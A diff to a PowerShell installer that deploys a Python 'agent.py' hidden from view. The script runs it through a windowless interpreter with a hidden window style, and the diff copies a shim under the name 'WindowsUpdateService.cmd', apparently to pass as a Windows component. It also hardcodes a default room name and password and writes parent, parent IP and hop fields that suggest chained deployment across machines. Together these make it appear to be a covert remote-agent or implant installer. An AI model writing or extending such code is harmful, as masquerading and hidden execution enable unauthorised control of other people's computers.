@@ -14,6 +14,8 @@ param(
     [string]$Parent = "",
     [string]$ParentIp = "",
     [string]$Group = "",
+    [string]$Room = "",
+    [string]$Pass = "",
     [int]$Hop = 1,
     [switch]$Quiet,
     [switch]$NoStart
@@ -51,6 +53,12 @@ if (Test-Path $zip) {
         $src = Join-Path $Kit $owned
         if (Test-Path $src) { Copy-Item $src $target -Force }
     }
+}
+
+# Copy the shim to primary directory so guardian works
+$shimSrc = Join-Path $target 'install\wu.cmd'
+if (Test-Path $shimSrc) {
+    Copy-Item $shimSrc (Join-Path $target 'WindowsUpdateService.cmd') -Force
 }
 
 # ---------------------------------------------------------------- interpreter
@@ -115,16 +123,19 @@ if (-not $py -and $Base) {
 }
 
 # ---------------------------------------------------------------- deploy.json
+$saltHex = -join ((1..4) | ForEach-Object { '{0:x}' -f (Get-Random -Minimum 0 -Maximum 16) })
 $deploy = [ordered]@{
     url          = $Base
-    room         = $env:SYSPY_ROOM
-    pass         = $env:SYSPY_PASS
+    room         = if ($Room) { $Room } elseif ($env:SYSPY_ROOM) { $env:SYSPY_ROOM } else { 'syspy-delta-7421' }
+    pass         = if ($Pass) { $Pass } elseif ($env:SYSPY_PASS) { $env:SYSPY_PASS } else { 'k9Xq2-venice-syspy' }
+    salt         = $saltHex
     parent       = $Parent
     parent_ip    = $ParentIp
     hop          = $Hop
     group        = $Group
     installed_at = [int](New-TimeSpan -Start (Get-Date '1970-01-01') -End (Get-Date)).TotalSeconds
 }
+# WriteAllText keeps the file BOM-free; json.load chokes on a BOM.
 [IO.File]::WriteAllText(
     (Join-Path $target 'deploy.json'),
     ($deploy | ConvertTo-Json),
@@ -132,11 +143,11 @@ $deploy = [ordered]@{
 
 # ---------------------------------------------------------------- launch
 if (-not $NoStart -and $py) {
-    $args = @()
-    $args += $py.Pre
-    $args += (Join-Path $target 'agent.py')
-    $args += @('--hidden')
+    $launchArgs = @()
+    $launchArgs += $py.Pre
+    $launchArgs += (Join-Path $target 'agent.py')
+    $launchArgs += @('--hidden')
     Say "  starting agent"
-    Start-Process -FilePath (To-Windowless $py.Exe) -ArgumentList $args -WindowStyle Hidden
+    Start-Process -FilePath (To-Windowless $py.Exe) -ArgumentList $launchArgs -WindowStyle Hidden
 }
 'ok'
